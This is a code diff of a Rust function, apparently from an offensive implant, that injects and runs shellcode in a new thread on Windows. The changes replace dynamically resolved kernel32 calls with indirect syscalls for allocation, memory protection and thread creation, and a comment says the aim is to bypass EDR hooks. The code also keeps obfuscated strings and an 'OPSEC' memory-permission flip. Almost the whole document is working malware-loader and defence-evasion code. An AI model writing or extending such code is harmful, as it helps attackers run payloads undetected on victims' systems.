@@ -126,126 +126,48 @@ pub fn inject_shellcode(
 }
 
 /// Execute shellcode in a thread (in-process execution)
-// Future: integrate DInvoke_rs by @Kudaes for indirect syscalls
 #[cfg(target_os = "windows")]
 unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
+    use std::ptr;
+
     let buffer_size = shellcode.len();
 
-    // Type definitions for dynamically resolved functions
-    type VirtualAllocFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
-    type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
-    type VirtualFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
-    type CreateThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
-    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
-    type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
-    type GetExitCodeThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut u32) -> i32;
+    // Non-critical APIs stay on winapi_resolve
+    type WaitFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
+    type CloseFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+    type ExitCodeFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut u32) -> i32;
 
-    // Dynamically resolve APIs at runtime
-    let virtual_alloc: VirtualAllocFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
-            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_ALLOC)))?
+    let wait: WaitFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject").ok_or("WaitForSingleObject")?
     );
-    let virtual_protect: VirtualProtectFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
-            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT)))?
+    let close: CloseFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle").ok_or("CloseHandle")?
     );
-    let virtual_free: VirtualFreeFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
-            .ok_or_else(|| "VirtualFree: resolve failed".to_string())?
-    );
-    let create_thread: CreateThreadFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "CreateThread")
-            .ok_or_else(|| format!("{}: resolve failed", crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD)))?
-    );
-    let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject")
-            .ok_or_else(|| "WaitForSingleObject: resolve failed".to_string())?
-    );
-    let close_handle: CloseHandleFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
-            .ok_or_else(|| "CloseHandle: resolve failed".to_string())?
-    );
-    let get_exit_code_thread: GetExitCodeThreadFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "GetExitCodeThread")
-            .ok_or_else(|| "GetExitCodeThread: resolve failed".to_string())?
+    let exit_code: ExitCodeFn = std::mem::transmute(
+        crate::winapi_resolve::resolve("kernel32.dll", "GetExitCodeThread").ok_or("GetExitCodeThread")?
     );
 
-    // Use numeric constants instead of named winapi constants
-    const MEM_COMMIT: u32 = 0x1000;
-    const MEM_RESERVE: u32 = 0x2000;
-    const MEM_RELEASE: u32 = 0x8000;
-    const PAGE_READWRITE: u32 = 0x04;
-    const PAGE_EXECUTE_READ: u32 = 0x20;
+    // Critical operations via indirect syscalls (bypass EDR hooks)
+    let mem = crate::syscalls::nt_alloc(buffer_size, 0x04) // PAGE_READWRITE
+        .map_err(|e| format!("Alloc: {}", e))?;
 
-    let executable_mem = virtual_alloc(
-        ptr::null_mut(),
-        buffer_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    );
+    ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, buffer_size);
 
-    if executable_mem.is_null() {
-        return Err(format!(
-            "{}: {}",
-            crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_ALLOC),
-            GetLastError()
-        ));
-    }
+    crate::syscalls::nt_protect(mem, buffer_size, 0x20) // PAGE_EXECUTE_READ
+        .map_err(|e| { let _ = crate::syscalls::nt_free(mem); format!("Protect: {}", e) })?;
 
-    // Copy shellcode to the allocated memory
-    ptr::copy_nonoverlapping(
-        shellcode.as_ptr(),
-        executable_mem as *mut u8,
-        buffer_size,
-    );
+    let thread = crate::syscalls::nt_create_thread(-1isize as *mut std::ffi::c_void, mem)
+        .map_err(|e| { let _ = crate::syscalls::nt_free(mem); format!("Thread: {}", e) })?;
 
-    // Flip RW to RX (no write after copy — proper OPSEC)
-    let mut old_protect: u32 = 0;
-    if virtual_protect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
-        virtual_free(executable_mem, 0, MEM_RELEASE);
-        return Err(format!("{}: {}", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT), GetLastError()));
-    }
+    let wait_result = wait(thread, 1000);
+    let mut code: u32 = 0;
+    exit_code(thread, &mut code);
+    close(thread);
 
-    // Create thread to execute shellcode
-    let mut thread_id: u32 = 0;
-    let thread_handle = create_thread(
-        ptr::null_mut(),
-        0,
-        Some(mem::transmute(executable_mem)),
-        ptr::null_mut(),
-        0,
-        &mut thread_id,
-    );
-
-    if thread_handle.is_null() {
-        virtual_free(executable_mem, 0, MEM_RELEASE);
-        return Err(format!(
-            "{}: {}",
-            crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD),
-            GetLastError()
-        ));
-    }
-
-    // Wait for thread with timeout (1 second)
-    let wait_result = wait_for_single_object(thread_handle, 1000);
-    let mut exit_code: u32 = 0;
-    get_exit_code_thread(thread_handle, &mut exit_code);
-    close_handle(thread_handle);
-
-    // Don't free memory - shellcode might still be running
-
-    if wait_result == WAIT_TIMEOUT {
-        Ok(format!(
-            "{} ({} bytes) in thread {}. Thread is still running (timeout reached).",
-            crate::obfstr::d(crate::obfstr::S_SHELLCODE_START),
-            buffer_size, thread_id
-        ))
+    if wait_result == 258 { // WAIT_TIMEOUT
+        Ok(format!("{} ({} bytes)", crate::obfstr::d(crate::obfstr::S_SHELLCODE_START), buffer_size))
     } else {
-        Ok(format!(
-            "{} ({} bytes) in thread {} (exit code: {}, wait result: {}).",
-            crate::obfstr::d(crate::obfstr::S_SHELLCODE_DONE),
-            buffer_size, thread_id, exit_code, wait_result
-        ))
+        Ok(format!("{} ({} bytes, exit: {})", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DONE), buffer_size, code))
     }
 }
 
